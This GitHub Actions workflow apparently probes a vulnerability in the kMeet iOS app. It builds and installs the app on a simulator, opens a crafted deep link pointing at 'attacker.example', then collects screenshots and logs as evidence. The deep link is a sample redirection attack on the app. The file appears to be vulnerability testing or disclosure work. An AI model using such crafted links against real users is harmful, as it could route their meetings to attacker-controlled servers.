name: kmeet-probe6
on: workflow_dispatch

jobs:
  probe:
    runs-on: macos-latest
    timeout-minutes: 150
    steps:
      - uses: actions/checkout@v4

      - name: Boot simulator
        run: |
          UDID=$(xcrun simctl list devices available | grep -m1 -i "iPhone 16" | sed -E 's/.*\(([0-9A-Fa-f-]{36})\).*/\1/')
          if [ -z "$UDID" ]; then UDID=$(xcrun simctl list devices available | grep -m1 -i "iPhone" | sed -E 's/.*\(([0-9A-Fa-f-]{36})\).*/\1/'); fi
          echo "UDID=$UDID" >> "$GITHUB_ENV"
          xcrun simctl boot "$UDID" || true
          xcrun simctl bootstatus "$UDID" -b || true

      - name: Build
        run: |
          set -o pipefail
          xcodebuild -project MeetInfomaniak.xcodeproj -scheme MeetInfomaniak -configuration Debug -derivedDataPath "$PWD/build" -destination "platform=iOS Simulator,id=$UDID" build 2>&1 | tail -25

      - name: Find and install
        run: |
          echo "== products tree =="; find "$PWD/build" -name "*.app" -maxdepth 8 -print
          APP=$(find "$PWD/build" -name "*.app" -maxdepth 8 | grep -vi "appex\|AppClip" | head -1)
          echo "chosen app=$APP"
          test -n "$APP" || { echo "NO APP BUNDLE FOUND"; exit 1; }
          /usr/libexec/PlistBuddy -c 'Print :CFBundleIdentifier' "$APP/Info.plist"
          xcrun simctl install "$UDID" "$APP"
          xcrun simctl io "$UDID" screenshot 00-baseline.png || true

      - name: Deep link
        run: |
          xcrun simctl terminate "$UDID" com.infomaniak.meet || true
          sleep 1
          xcrun simctl openurl "$UDID" "kmeet://attacker.example/room?username=Bob"
          for i in 1 2 3 4 5 6; do sleep 2; xcrun simctl io "$UDID" screenshot "10-deeplink-$i.png" || true; done

      - name: Logs
        run: |
          xcrun simctl spawn "$UDID" log show --last 3m --style compact --predicate 'processImagePath CONTAINS "MeetInfomaniak"' > applog.txt 2>&1 || true
          echo "=== attacker.example ==="; grep -i "attacker.example" applog.txt | head -20 || echo none
          echo "=== config/jitsi ==="; grep -iE "config.js|JitsiMeet|conference" applog.txt | head -20 || true

      - name: Control no username
        run: |
          xcrun simctl terminate "$UDID" com.infomaniak.meet || true
          sleep 1
          xcrun simctl openurl "$UDID" "kmeet://attacker.example/room"
          sleep 8
          xcrun simctl io "$UDID" screenshot 20-control.png || true

      - name: Upload
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: kmeet-evidence
          path: |
            *.png
            applog.txt
          if-no-files-found: warn
